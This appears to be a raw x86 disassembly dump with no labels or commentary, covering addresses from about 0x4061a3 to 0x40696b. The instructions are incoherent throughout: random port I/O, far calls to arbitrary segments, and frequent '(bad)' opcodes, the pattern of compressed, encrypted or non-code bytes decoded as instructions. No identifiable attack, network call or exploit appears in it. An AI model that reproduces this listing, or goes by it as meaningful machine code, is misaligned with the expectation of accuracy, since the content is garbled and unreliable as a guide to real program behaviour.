  4061a3:	push   edx
  4061a4:	mov    ebp,ecx
  4061a6:	not    DWORD PTR [di+0x3611]
  4061ab:	test   bh,ch
  4061ad:	enter  0x29d6,0xc0
  4061b1:	je     0x406136
  4061b3:	ret    0xb7a0
  4061b6:	retf   
  4061b7:	dec    esp
  4061b8:	in     eax,0x87
  4061ba:	dec    edi
  4061bb:	inc    ebp
  4061bc:	outs   dx,DWORD PTR es:[esi]
  4061be:	mov    ds:0x906d6ed2,al
  4061c3:	jb     0x4061bb
  4061c5:	out    dx,al
  4061c6:	jp     0x4061b7
  4061c8:	aas    
  4061c9:	lods   al,BYTE PTR ds:[esi]
  4061ca:	std    
  4061cb:	sub    al,0xc8
  4061cd:	pop    esp
  4061ce:	xchg   edi,eax
  4061cf:	sbb    al,0x9f
  4061d1:	adc    edx,DWORD PTR [ecx]
  4061d3:	add    eax,0x87d96366
  4061d8:	dec    ebx
  4061d9:	pop    esi
  4061da:	out    dx,eax
  4061db:	or     eax,0xce3b9faf
  4061e0:	dec    edx
  4061e1:	xchg   ebx,eax
  4061e2:	sbb    cl,BYTE PTR [ecx+0x44]
  4061e5:	or     edi,DWORD PTR [edi-0x6]
  4061e8:	mov    bh,0x40
  4061ea:	ja     0x4061a7
  4061ec:	mov    fs,WORD PTR [ebx-0x33]
  4061ef:	fwait
  4061f0:	jbe    0x4061f5
  4061f2:	pop    esp
  4061f3:	ja     0x4061e1
  4061f5:	xchg   ecx,eax
  4061f6:	mov    eax,0x96a512e2
  4061fb:	pop    esp
  4061fc:	mov    cl,0xd7
  4061fe:	push   ebp
  4061ff:	xor    DWORD PTR [ebx+0x3c8c3f63],0xffd162a4
  406209:	test   al,0x30
  40620b:	mov    bh,0xb2
  40620d:	stos   BYTE PTR es:[edi],al
  40620e:	ss int3 
  406210:	and    eax,0x8c909703
  406215:	push   ebx
  406216:	imul   ebp,DWORD PTR ds:0xd3559cc0,0x28d1bf10
  406220:	cwde   
  406221:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406222:	in     eax,0x5
  406224:	jae    0x40620b
  406226:	stos   DWORD PTR es:[edi],eax
  406227:	shr    DWORD PTR [esi-0x1e],cl
  40622a:	loop   0x4061b3
  40622c:	push   ebx
  40622d:	jns    0x4062a7
  40622f:	(bad)  
  406230:	mov    al,ds:0xd4d6d89a
  406235:	mov    dl,0xdd
  406237:	and    DWORD PTR cs:[esi],esi
  40623a:	push   edi
  40623b:	ins    BYTE PTR es:[edi],dx
  40623c:	xor    eax,edx
  40623e:	in     eax,dx
  40623f:	(bad)  
  406240:	aam    0xed
  406242:	fwait
  406243:	aas    
  406244:	mov    edi,0x8e553330
  406249:	pop    ss
  40624a:	fmulp  st(6),st
  40624c:	mov    esi,0xbc137eaa
  406251:	push   edx
  406252:	xor    al,0x31
  406254:	retf   
  406255:	aas    
  406256:	dec    ecx
  406257:	mov    WORD PTR [ecx+0x30f19c6a],gs
  40625d:	and    al,0x13
  40625f:	mov    ch,0x9
  406261:	call   0x6cb:0xcd306c9d
  406268:	daa    
  406269:	fwait
  40626a:	not    bl
  40626c:	push   ebx
  40626d:	xchg   ecx,eax
  40626e:	aad    0xa5
  406270:	fadd   DWORD PTR [edx+ecx*4-0x5a]
  406274:	dec    eax
  406275:	push   ds
  406276:	lds    eax,FWORD PTR [edx]
  406278:	not    ecx
  40627a:	jg     0x406252
  40627c:	or     eax,0xe0fbe2a7
  406281:	out    0x47,al
  406283:	loopne 0x4062f3
  406285:	pushf  
  406286:	cmc    
  406287:	mov    ch,0x6a
  406289:	adc    eax,DWORD PTR [edx]
  40628b:	stc    
  40628c:	dec    esi
  40628d:	das    
  40628e:	mov    ebx,0x13f97c6f
  406293:	pop    eax
  406294:	pop    es
  406295:	stos   DWORD PTR es:[edi],eax
  406296:	cmp    DWORD PTR ds:0xa15662fd,ebp
  40629c:	rcl    DWORD PTR [eax-0x16bcf619],0xbd
  4062a3:	(bad)  
  4062a5:	lods   eax,DWORD PTR ds:[esi]
  4062a6:	cmp    DWORD PTR [edi-0x55eca5ad],ebp
  4062ac:	xchg   ebp,eax
  4062ad:	sub    cl,cl
  4062af:	or     dl,0xd9
  4062b2:	push   ecx
  4062b3:	ins    BYTE PTR es:[edi],dx
  4062b4:	int    0xe
  4062b6:	sbb    ah,0x50
  4062b9:	out    0x8e,al
  4062bb:	addr16 test eax,0x66528096
  4062c1:	cmp    edi,0x79ccb878
  4062c7:	imul   esp,DWORD PTR [ebx],0x66
  4062ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062cb:	outs   dx,DWORD PTR ds:[esi]
  4062cc:	dec    ecx
  4062cd:	adc    BYTE PTR [ecx],0x65
  4062d0:	adc    al,0x49
  4062d2:	jle    0x4062bf
  4062d4:	cwde   
  4062d5:	in     eax,0x29
  4062d7:	sub    DWORD PTR [ecx+edx*8+0x35],0xffffff80
  4062dc:	(bad)  
  4062de:	push   edx
  4062df:	fwait
  4062e0:	(bad)
  4062e3:	cmp    BYTE PTR [esi+0x668e927c],al
  4062e9:	repz jmp eax
  4062ec:	js     0x406302
  4062ee:	stos   BYTE PTR es:[edi],al
  4062ef:	jo     0x4062ca
  4062f1:	inc    ebp
  4062f2:	dec    esi
  4062f3:	dec    edx
  4062f4:	sbb    al,0x67
  4062f6:	stos   DWORD PTR es:[edi],eax
  4062f7:	clc    
  4062f8:	pop    edi
  4062fa:	arpl   bp,si
  4062fc:	and    bl,BYTE PTR [eax+eiz*1]
  4062ff:	mov    ebp,0x32eca77b
  406304:	jg     0x406331
  406306:	mov    dl,0x2a
  406308:	xor    eax,0xa62e3b82
  40630d:	fs pop edx
  40630f:	mov    al,ds:0x2ce4ebea
  406314:	popa   
  406315:	fsubp  st(3),st
  406317:	(bad)  [edi+0x62da332]
  40631d:	loop   0x406304
  40631f:	inc    ebp
  406320:	cmp    cl,BYTE PTR [edi]
  406322:	add    eax,DWORD PTR [ecx]
  406324:	in     al,dx
  406325:	xor    ecx,DWORD PTR [edi+0xc808f0]
  40632b:	ss int3 
  40632d:	pop    ecx
  40632e:	repz xchg ebx,eax
  406330:	pusha  
  406331:	ins    DWORD PTR es:[edi],dx
  406332:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406333:	xlat   BYTE PTR ds:[ebx]
  406334:	inc    esp
  406335:	add    al,0xd2
  406337:	mov    edi,0x4cfa7b40
  40633c:	lods   al,BYTE PTR ds:[esi]
  40633d:	jl     0x406371
  40633f:	jecxz  0x406397
  406341:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406342:	(bad)  
  406343:	inc    eax
  406344:	aaa    
  406345:	mov    edx,0x2cf46c93
  40634a:	sub    eax,0xde1d4604
  40634f:	xchg   BYTE PTR [esi],ch
  406351:	push   esp
  406352:	mov    eax,0x55224a61
  406357:	rcr    DWORD PTR [eax],1
  406359:	sbb    BYTE PTR [eax],al
  40635b:	(bad)  
  40635c:	hlt    
  40635d:	dec    edi
  40635e:	icebp  
  40635f:	pop    edi
  406360:	inc    edi
  406361:	adc    eax,DWORD PTR [ebp-0x5]
  406364:	and    al,0xd0
  406366:	pushf  
  406367:	jae    0x4063e0
  406369:	pushf  
  40636a:	test   BYTE PTR [edi+0x53],bh
  40636d:	enter  0x202,0x6b
  406371:	mov    dl,0xf
  406373:	and    eax,0xfc5c39d8
  406378:	xchg   dh,dh
  40637a:	sub    eax,0xc2453dbc
  40637f:	sbb    al,0x54
  406381:	inc    ebx
  406382:	ret    0x2f9
  406385:	loopne 0x4063d6
  406387:	cmovae edx,DWORD PTR [edi+0x5e9a4acb]
  40638e:	imul   edx,DWORD PTR [edi+0x21bff8d8],0x56
  406395:	xlat   BYTE PTR ds:[ebx]
  406396:	mov    WORD PTR [ecx+0x2a],?
  406399:	clc    
  40639a:	adc    eax,0x9b0d0e24
  40639f:	test   BYTE PTR [ecx+ebp*4],dl
  4063a2:	call   0x8565ed67
  4063a7:	sbb    BYTE PTR [ecx+0x44],bl
  4063aa:	retf   0x3678
  4063ad:	pop    eax
  4063ae:	in     al,0x1d
  4063b0:	hlt    
  4063b1:	add    edx,DWORD PTR [edx]
  4063b3:	add    ebx,DWORD PTR [ebx-0x58]
  4063b6:	cdq    
  4063b7:	cli    
  4063b8:	je     0x40636a
  4063ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063bb:	popf   
  4063bc:	test   BYTE PTR [eax],bl
  4063be:	mov    eax,cs
  4063c0:	lods   eax,DWORD PTR ds:[esi]
  4063c1:	adc    DWORD PTR [esi],ecx
  4063c3:	inc    edi
  4063c4:	in     al,dx
  4063c5:	sub    al,0xe0
  4063c7:	nop
  4063c8:	cmp    BYTE PTR [ebx-0x7a],0x5d
  4063cc:	and    al,0x88
  4063ce:	cs mov eax,0x984d4a75
  4063d4:	xchg   esi,eax
  4063d5:	jg     0x40642c
  4063d7:	add    edi,ebp
  4063d9:	and    edi,ebp
  4063db:	dec    esp
  4063dc:	icebp  
  4063dd:	mov    edx,0xd426d647
  4063e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063e3:	and    DWORD PTR [edi],ecx
  4063e5:	mov    dh,0x63
  4063e7:	add    BYTE PTR [esi-0x9952630],0x5f
  4063ee:	adc    esp,ebp
  4063f0:	int    0x89
  4063f2:	cmp    WORD PTR [edi+0x133a0cdb],0xffdc
  4063fa:	inc    esp
  4063fb:	lea    edi,[esi+0x28]
  4063fe:	daa    
  4063ff:	add    BYTE PTR [ecx+0x71],al
  406402:	push   ds
  406403:	fld    TBYTE PTR [ebx+0x15f8e805]
  406409:	fidiv  DWORD PTR [ecx-0x2d]
  40640c:	lods   al,BYTE PTR ds:[esi]
  40640d:	push   es
  40640e:	cwde   
  40640f:	arpl   WORD PTR [eax-0x1e],cx
  406412:	in     al,0x7a
  406414:	inc    ecx
  406415:	pop    edx
  406416:	adc    DWORD PTR [ecx-0x2f],edi
  406419:	call   0xf0854bca
  40641e:	adc    BYTE PTR [ebp-0x57],bh
  406421:	add    BYTE PTR [esi],al
  406423:	lds    ebp,FWORD PTR [ebp+ecx*8-0x13]
  406427:	das    
  406428:	pusha  
  406429:	push   cs
  40642a:	arpl   WORD PTR [eax],di
  40642c:	dec    ebx
  40642d:	mov    bh,BYTE PTR [edx-0x16]
  406430:	clc    
  406431:	aad    0xe2
  406433:	fsubp  st(3),st
  406435:	and    DWORD PTR [ebx+0x54],edx
  406438:	and    eax,0x650fa4fb
  40643d:	sbb    al,cl
  40643f:	dec    edx
  406440:	xchg   ecx,eax
  406441:	jne    0x406424
  406443:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406444:	ror    DWORD PTR [edi+0x128cad27],0x8f
  40644b:	jg     0x406446
  40644d:	stos   BYTE PTR es:[edi],al
  40644e:	xchg   ecx,eax
  40644f:	test   dh,ah
  406451:	jmp    0x2b4b432d
  406456:	and    al,BYTE PTR [ebp+0x2c]
  406459:	mov    edi,0x6b3bd3de
  40645e:	fistp  DWORD PTR [ebp+0x7e64970e]
  406464:	xor    ah,BYTE PTR [ebx-0x21]
  406467:	frstor [eax-0x7c]
  40646a:	adc    cl,cl
  40646c:	rcr    DWORD PTR [edi-0x1c80f8e1],0x6d
  406473:	adc    DWORD PTR [esi-0xd],ebp
  406476:	mov    esi,0x13c7c85
  40647b:	lds    eax,FWORD PTR [ecx-0x110c93e2]
  406481:	dec    ecx
  406482:	cli    
  406483:	cmc    
  406484:	add    al,dh
  406486:	xor    eax,0xccdb3d22
  40648b:	cld    
  40648c:	inc    ebx
  40648d:	push   esp
  40648e:	inc    ebp
  40648f:	pop    es
  406490:	arpl   sp,ax
  406492:	push   es
  406493:	push   ecx
  406494:	je     0x40646b
  406496:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406497:	or     eax,0x8a567e35
  40649c:	test   eax,0x449ec508
  4064a1:	scas   al,BYTE PTR es:[edi]
  4064a2:	mov    al,0xab
  4064a4:	dec    ebp
  4064a5:	mov    dl,0x74
  4064a7:	cld    
  4064a8:	cmp    DWORD PTR [edx+0x49c4d84f],0xffffffd8
  4064af:	push   cs
  4064b0:	xor    eax,0x211a942
  4064b5:	jg     0x406530
  4064b7:	sub    cl,BYTE PTR es:[edx]
  4064ba:	ins    DWORD PTR es:[edi],dx
  4064bb:	imul   ebx,ecx,0xa
  4064be:	shl    DWORD PTR [edx],cl
  4064c0:	or     DWORD PTR [ecx],0x2f
  4064c3:	(bad)  
  4064c4:	cmc    
  4064c5:	call   0xdcfd:0x9e142e7f
  4064cc:	out    0x37,al
  4064ce:	push   ecx
  4064cf:	mov    al,ds:0x5b5f4819
  4064d4:	xor    ch,BYTE PTR [eax]
  4064d6:	fcmovnbe st,st(0)
  4064d8:	xchg   edx,eax
  4064d9:	xor    ebx,DWORD PTR [edi]
  4064db:	jbe    0x40650e
  4064dd:	sub    al,ah
  4064df:	addr16 xchg esp,eax
  4064e1:	and    edx,edi
  4064e3:	inc    ebx
  4064e4:	lea    ecx,[edx]
  4064e6:	shr    BYTE PTR [ebx-0x596a7669],cl
  4064ec:	setle  BYTE PTR [ebp-0x1ad81524]
  4064f3:	ret    0x77da
  4064f6:	outs   dx,BYTE PTR ds:[esi]
  4064f7:	xor    DWORD PTR [esi+0x5e0c75a4],0xfc5eddb8
  406501:	iret   
  406502:	pop    edi
  406503:	xor    eax,0xae19a10
  406508:	jnp    0x40652d
  40650a:	es and al,0x15
  40650d:	add    esp,DWORD PTR [edx-0x7ffc36fb]
  406513:	call   0xa003:0xe02a5eb4
  40651a:	neg    BYTE PTR [esi+0x212c3733]
  406520:	cmp    al,0x18
  406522:	xchg   ecx,eax
  406523:	pushf  
  406524:	adc    esp,edx
  406526:	add    al,0x82
  406528:	add    al,0xc
  40652a:	jae    0x406525
  40652c:	and    esi,DWORD PTR [ecx+0x426c00dc]
  406532:	aaa    
  406533:	cmp    DWORD PTR [ebp+eax*4+0x7],ebp
  406537:	stos   DWORD PTR es:[edi],eax
  406538:	xor    bh,0xd1
  40653b:	pop    eax
  40653c:	icebp  
  40653d:	stc    
  40653e:	push   0x67
  406540:	xor    al,0x5b
  406542:	pop    es
  406543:	aad    0x20
  406545:	mov    esp,0x235cd1d4
  40654a:	xor    ebx,DWORD PTR [edi-0x35]
  40654d:	mov    ds:0xbaa9141c,al
  406552:	or     esp,DWORD PTR [edi+0x57]
  406555:	out    0xba,al
  406557:	leave  
  406558:	pop    edx
  406559:	push   ebx
  40655a:	out    dx,al
  40655b:	popa   
  40655c:	lods   eax,DWORD PTR ds:[esi]
  40655d:	popa   
  40655e:	scas   al,BYTE PTR es:[edi]
  40655f:	jg     0x4065a9
  406561:	cdq    
  406562:	sbb    BYTE PTR [edx-0x13f480ee],bl
  406568:	pop    ss
  406569:	outs   dx,DWORD PTR ds:[esi]
  40656a:	fwait
  40656b:	pop    ecx
  40656c:	add    DWORD PTR [ebp-0x17],edx
  40656f:	ins    DWORD PTR es:[edi],dx
  406570:	xor    al,0x16
  406572:	data16 addr16 in al,0xb0
  406576:	shl    bl,cl
  406578:	je     0x406569
  40657a:	scas   eax,DWORD PTR es:[edi]
  40657b:	aas    
  40657c:	inc    DWORD PTR ss:[esp+eax*2-0x2cb11bab]
  406584:	mov    WORD PTR [edi-0x75],gs
  406587:	clc    
  406588:	sub    esi,DWORD PTR [edi+eax*1-0x1da7ba32]
  40658f:	cdq    
  406590:	xor    DWORD PTR [esi],0x11
  406593:	mov    esi,0xc1e475d8
  406598:	imul   eax,DWORD PTR [esi+0x3d2a52a8],0xffffffe0
  40659f:	aad    0xda
  4065a1:	inc    ebp
  4065a2:	das    
  4065a3:	jnp    0x4065a6
  4065a5:	or     al,0x4b
  4065a7:	arpl   WORD PTR [eax],ax
  4065a9:	bound  ebp,QWORD PTR [ebp-0x2ba74d9d]
  4065af:	stos   BYTE PTR es:[edi],al
  4065b0:	sub    DWORD PTR ds:[eax-0x2d12bdf4],0x14
  4065b8:	sbb    BYTE PTR [esi-0x695cff05],dl
  4065be:	mov    DWORD PTR [edx+0x38],esp
  4065c1:	sub    dl,BYTE PTR [edx]
  4065c3:	arpl   si,sp
  4065c5:	jmp    FWORD PTR [edi-0x2a]
  4065c8:	cmp    eax,0x13c73878
  4065cd:	das    
  4065ce:	loope  0x4065e4
  4065d0:	xor    BYTE PTR [eax+ebx*4+0x5d],ch
  4065d4:	out    0x3f,eax
  4065d6:	sub    al,0xc1
  4065d8:	sub    al,0x40
  4065da:	sub    eax,0x6db062f4
  4065df:	jo     0x406628
  4065e1:	adc    al,BYTE PTR [edi]
  4065e3:	cld    
  4065e4:	inc    edx
  4065e5:	cmp    al,0xc4
  4065e7:	cmp    ecx,DWORD PTR [edi]
  4065e9:	leave  
  4065ea:	scas   ax,WORD PTR es:[edi]
  4065ec:	xor    al,0xbd
  4065ee:	or     edi,eax
  4065f0:	sub    al,0x77
  4065f2:	loopne 0x4065a0
  4065f4:	xchg   edi,eax
  4065f5:	cli    
  4065f6:	fbld   TBYTE PTR [esp+edi*8+0x19]
  4065fa:	add    DWORD PTR [eax],ebp
  4065fc:	enter  0xda4d,0x42
  406600:	pop    es
  406601:	je     0x4065c2
  406603:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406604:	stos   BYTE PTR es:[edi],al
  406605:	or     eax,0xabdc2899
  40660a:	jp     0x406652
  40660c:	add    DWORD PTR [edx+eiz*2+0x12fb4f66],eax
  406613:	ins    BYTE PTR es:[edi],dx
  406614:	inc    eax
  406615:	test   eax,0xbcda8e56
  40661a:	push   esp
  40661b:	mov    dl,0x8
  40661d:	test   al,0x8c
  40661f:	mov    ecx,DWORD PTR [ebp-0x49]
  406622:	push   dx
  406624:	popf   
  406625:	dec    edx
  406626:	ror    BYTE PTR [esi],0xfe
  406629:	or     al,0x17
  40662b:	mov    eax,0xca906264
  406630:	mov    eax,0xb908a59e
  406635:	shr    BYTE PTR [eax],0x45
  406638:	fimul  WORD PTR [ebx]
  40663a:	xor    BYTE PTR [ecx-0x75],bh
  40663d:	mov    DWORD PTR [edi+0x3e],edx
  406640:	pop    edx
  406641:	push   edi
  406642:	sahf   
  406643:	pop    edi
  406644:	jg     0x4065dc
  406646:	xlat   BYTE PTR ds:[ebx]
  406647:	es fmul st(7),st
  40664a:	sub    eax,0x713e1200
  40664f:	pop    ds
  406650:	jne    0x406696
  406652:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406653:	mov    edi,0x2684079d
  406658:	fst    st(4)
  40665a:	fnstenv [esi]
  40665c:	jle    0x40669a
  40665e:	sahf   
  40665f:	dec    esp
  406660:	in     al,dx
  406661:	or     ebx,DWORD PTR [esi+edx*8+0x3a64fea4]
  406668:	pop    ds
  406669:	(bad)  
  40666a:	jmp    0x5d8dbd4e
  40666f:	xchg   al,bl
  406671:	pop    ebp
  406672:	cmc    
  406673:	adc    ebx,DWORD PTR [ebx+0x70a793a0]
  406679:	lahf   
  40667a:	fdivr  QWORD PTR [eax]
  40667d:	dec    eax
  40667e:	lods   eax,DWORD PTR ds:[esi]
  40667f:	cdq    
  406680:	call   0x813b4c40
  406685:	lahf   
  406686:	mov    ds:0xe120aac1,al
  40668b:	xor    al,BYTE PTR [edx]
  40668d:	iret   
  40668e:	mov    dh,0xc1
  406690:	xchg   esp,eax
  406691:	lds    esp,FWORD PTR [ebp-0x7c]
  406694:	jns    0x406709
  406696:	out    0x88,al
  406698:	leave  
  406699:	mov    esp,0xb60ad5e
  40669e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40669f:	push   esi
  4066a0:	loope  0x4066df
  4066a2:	xlat   BYTE PTR ds:[ebx]
  4066a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066a4:	mov    al,0x4a
  4066a6:	xchg   DWORD PTR [edx],ebx
  4066a8:	mov    esi,0x8650de94
  4066ad:	stos   BYTE PTR es:[edi],al
  4066ae:	mov    esp,0xdb682025
  4066b3:	hlt    
  4066b4:	sub    BYTE PTR ds:0x65c1f3ad,al
  4066ba:	rol    BYTE PTR [eax+0x77],0x8a
  4066be:	fwait
  4066bf:	shl    BYTE PTR [edi+eax*1],0xd1
  4066c3:	data16 (bad) 
  4066c5:	jbe    0x4066e1
  4066c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066c8:	push   es
  4066c9:	std    
  4066ca:	fistp  DWORD PTR [esi-0x5aa52c29]
  4066d0:	out    0x2a,eax
  4066d2:	dec    edx
  4066d3:	xor    eax,0xab9fd6bb
  4066d8:	mov    edi,0x13e60013
  4066dd:	adc    eax,0xd5434919
  4066e2:	and    esi,eax
  4066e4:	xchg   edx,eax
  4066e5:	icebp  
  4066e6:	push   0x57986f4d
  4066eb:	or     bl,BYTE PTR [eax]
  4066ed:	adc    esi,DWORD PTR [eax]
  4066ef:	or     BYTE PTR [esi+0x4633d2b0],cl
  4066f5:	sub    esp,DWORD PTR [eax]
  4066f7:	jne    0x4066cc
  4066f9:	sahf   
  4066fa:	push   esp
  4066fb:	sar    BYTE PTR ds:0x1021fa21,0xb9
  406702:	test   eax,0xb768d4e7
  406707:	pop    ecx
  406708:	(bad)  
  40670a:	aaa    
  40670b:	ja     0x4066c4
  40670d:	lods   al,BYTE PTR ds:[esi]
  40670e:	jp     0x4066d6
  406710:	jle    0x406772
  406712:	call   0xc1b2:0x3667498c
  406719:	loop   0x406781
  40671b:	lahf   
  40671c:	or     BYTE PTR [ebp-0x60],bl
  40671f:	dec    BYTE PTR [edi]
  406721:	pop    edx
  406722:	sbb    BYTE PTR [eax-0x196e99cc],ch
  406728:	call   0x7e51:0x9539a96e
  40672f:	fs dec ebp
  406731:	xor    bh,BYTE PTR [edi-0xfc99cd2]
  406737:	jnp    0x406743
  406739:	fstp   TBYTE PTR [esi]
  40673b:	sbb    DWORD PTR [ebx-0x75],ebx
  40673e:	pop    ds
  40673f:	shr    BYTE PTR ds:0x26d2a510,cl
  406745:	call   0x81cd:0x2f4d3d09
  40674c:	test   al,0x5
  40674e:	adc    ecx,0x603760b1
  406754:	rol    BYTE PTR [eax+0x75],1
  406757:	cmp    eax,0xdf5813cc
  40675c:	push   ebp
  40675d:	sub    eax,0xc9264c11
  406762:	and    ch,BYTE PTR [ebx]
  406764:	jbe    0x40671c
  406766:	scas   al,BYTE PTR es:[edi]
  406767:	cmp    DWORD PTR [ecx-0x5cc23171],edi
  40676d:	popa   
  40676e:	fstp   QWORD PTR [ecx+0x24596669]
  406774:	xchg   esp,eax
  406775:	xor    eax,0x2e745663
  40677a:	xchg   ebx,eax
  40677b:	mov    DWORD PTR [edi+0x14],eax
  40677e:	(bad)  
  406780:	fistp  WORD PTR [eax+edx*8+0x52]
  406784:	dec    edi
  406785:	out    0x93,eax
  406787:	sbb    eax,0xcdf6224d
  40678c:	sar    DWORD PTR [esi-0x48766257],1
  406792:	sub    eax,0x1db7d841
  406797:	add    bl,BYTE PTR [edi-0x4bc0eb4e]
  40679d:	jmp    0x4067a5
  40679f:	sbb    al,0x1d
  4067a2:	out    dx,al
  4067a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067a4:	fstp   DWORD PTR [edi+eax*1+0xa]
  4067a8:	(bad)  
  4067ab:	(bad)  
  4067ad:	dec    ecx
  4067ae:	inc    edi
  4067af:	jge    0x4067d5
  4067b1:	xchg   esi,eax
  4067b2:	fidivr WORD PTR [ebx-0x5d3e8fd6]
  4067b8:	or     ah,BYTE PTR ds:0xce0ea199
  4067be:	xor    dl,BYTE PTR [eax]
  4067c0:	mov    ebp,0x2fa4da55
  4067c5:	stos   DWORD PTR es:[edi],eax
  4067c6:	lods   al,BYTE PTR ds:[esi]
  4067c7:	in     al,0x22
  4067c9:	(bad)  
  4067ca:	ja     0x4067e8
  4067cc:	out    0x8f,al
  4067ce:	add    DWORD PTR [ecx+0x3b],esp
  4067d1:	aaa    
  4067d2:	cmp    DWORD PTR [esi+0x55],ecx
  4067d5:	iret   
  4067d6:	or     al,0xa1
  4067d8:	dec    esi
  4067d9:	push   0x77395c35
  4067de:	add    esp,esi
  4067e0:	dec    ebx
  4067e1:	push   ss
  4067e2:	test   DWORD PTR [ecx+0x4bac437b],esp
  4067e8:	dec    esp
  4067e9:	lahf   
  4067ea:	jmp    DWORD PTR [ebx+0x3169d76c]
  4067f0:	call   0xabd0c8ac
  4067f5:	pop    eax
  4067f6:	call   DWORD PTR [eax]
  4067f8:	aam    0xed
  4067fa:	sbb    esp,edi
  4067fc:	fwait
  4067fd:	sub    eax,0x6e9d03a2
  406802:	in     al,dx
  406803:	sub    eax,0x459144c5
  406808:	adc    ecx,DWORD PTR [esi-0x6849b418]
  40680e:	imul   ecx,DWORD PTR cs:[edx],0x2879442e
  406815:	push   ebx
  406816:	mov    DWORD PTR [ebx-0x1b],ebx
  406819:	xor    al,0x91
  40681b:	jne    0x406825
  40681d:	ins    BYTE PTR es:[edi],dx
  40681e:	enter  0xaed8,0xf3
  406822:	sbb    ch,al
  406824:	outs   dx,BYTE PTR ds:[esi]
  406825:	xor    esi,DWORD PTR [ecx+0xd584b73]
  40682b:	fdiv   QWORD PTR [edi+0x0]
  40682e:	ret    0x65c6
  406831:	popa   
  406832:	mov    eax,0xfc3332
  406837:	jns    0x406880
  406839:	lea    ebp,[edi+0x2092065c]
  40683f:	ins    DWORD PTR es:[edi],dx
  406840:	and    ch,BYTE PTR [ebx]
  406842:	xor    eax,DWORD PTR [ecx]
  406844:	loope  0x4067fe
  406846:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406847:	sahf   
  406848:	cld    
  406849:	mov    eax,0x4f42ae6f
  40684e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40684f:	cmp    bh,cl
  406851:	xor    dl,ah
  406853:	stc    
  406854:	fsubr  DWORD PTR [ecx+edi*8]
  406857:	cmp    BYTE PTR [ebx-0x14969018],bh
  40685d:	shl    BYTE PTR [esi],0x85
  406860:	in     eax,dx
  406861:	fstp   QWORD PTR [esi-0x5a5ee03a]
  406867:	int    0x80
  406869:	outs   dx,DWORD PTR ds:[esi]
  40686a:	test   al,dh
  40686c:	cmc    
  40686d:	gs jle 0x4068e1
  406870:	jmp    0xa71e2479
  406875:	xchg   ebx,eax
  406876:	push   esp
  406877:	shr    BYTE PTR [ebx-0x1f32d76c],1
  40687d:	mov    ah,0x65
  40687f:	dec    ebp
  406880:	rcl    BYTE PTR [eax-0x3c],0xce
  406884:	mov    dl,BYTE PTR [edx+0x64]
  406887:	dec    esi
  406888:	lds    edi,FWORD PTR [edx-0x31]
  40688b:	ds scas eax,DWORD PTR es:[edi]
  40688d:	call   FWORD PTR [ebp+0x630d73bd]
  406893:	mov    edx,0xa9e5ad35
  406898:	imul   edi,DWORD PTR [ecx+0x38392f73],0xffffffaf
  40689f:	mov    edx,0x7eb2c5b5
  4068a4:	retf   
  4068a5:	(bad)  
  4068a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068a7:	ror    BYTE PTR [edx],0xfe
  4068aa:	lock xchg esi,eax
  4068ac:	mov    ds:0xa8e4d4d9,eax
  4068b1:	pusha  
  4068b2:	mov    ecx,0x5574f175
  4068b7:	xchg   ecx,eax
  4068b8:	jne    0x406861
  4068ba:	inc    esp
  4068bb:	fisub  WORD PTR ds:0x99e1ec55
  4068c1:	push   ds
  4068c2:	out    dx,eax
  4068c3:	outs   dx,BYTE PTR ds:[esi]
  4068c4:	imul   ecx,DWORD PTR [edx-0xb8e2957],0x736c201d
  4068ce:	or     ch,ah
  4068d0:	loop   0x406884
  4068d2:	mov    edx,0xc1a1077d
  4068d7:	sbb    eax,0x8bb2bd67
  4068dc:	xchg   ebx,eax
  4068dd:	cmpxchg DWORD PTR [ebx+ebx*2],edi
  4068e1:	mov    al,ds:0x51e04e58
  4068e6:	sti    
  4068e7:	or     al,0xea
  4068e9:	push   edx
  4068ea:	call   0x6791:0x2c7b821f
  4068f1:	cld    
  4068f2:	fstp   TBYTE PTR [edx-0xff36fa0]
  4068f8:	mov    edi,0xcf834819
  4068fd:	pop    es
  4068fe:	mov    eax,ds:0xbb794736
  406903:	fcmovbe st,st(0)
  406905:	jmp    0x40692f
  406907:	cmp    BYTE PTR [eax-0x41],ch
  40690a:	test   DWORD PTR [esi+0x3b001ada],ebp
  406910:	sub    eax,0xc17b422a
  406915:	(bad)  
  406917:	je     0x4068c6
  406919:	test   al,0xe6
  40691b:	sti    
  40691c:	dec    edx
  40691d:	je     0x406951
  40691f:	repnz sub bh,BYTE PTR [ebx]
  406922:	fisttp DWORD PTR [edi+edx*2]
  406925:	loopne 0x40698f
  406927:	or     BYTE PTR [edi+0x1a],bh
  40692a:	xchg   ebx,eax
  40692b:	push   es
  40692c:	(bad)  
  40692d:	imul   edi,DWORD PTR [esi-0x1dcb7b47],0xffffffa3
  406934:	icebp  
  406935:	fs fwait
  406937:	pop    edx
  406938:	data16 or al,0xb9
  40693b:	xchg   ebx,eax
  40693c:	aam    0x5b
  40693e:	cmp    BYTE PTR [edi+eax*2-0x4b],ch
  406942:	scas   eax,DWORD PTR es:[edi]
  406943:	xor    al,0xac
  406945:	mov    BYTE PTR [ebp+0x10],al
  406948:	lahf   
  406949:	call   0x2d2a:0xafc0f1e5
  406950:	jl     0x40697a
  406952:	in     eax,0xa4
  406954:	cmp    eax,0xe137f33e
  406959:	push   edx
  40695a:	pop    ebp
  40695b:	xchg   ecx,eax
  40695c:	inc    esp
  40695d:	xor    BYTE PTR [eax],cl
  40695f:	aaa    
  406960:	inc    ebx
  406961:	imul   ebp,DWORD PTR [esi],0xffffff83
  406964:	sub    BYTE PTR [esi-0x6539af43],0x21
  40696b:	pop    ss
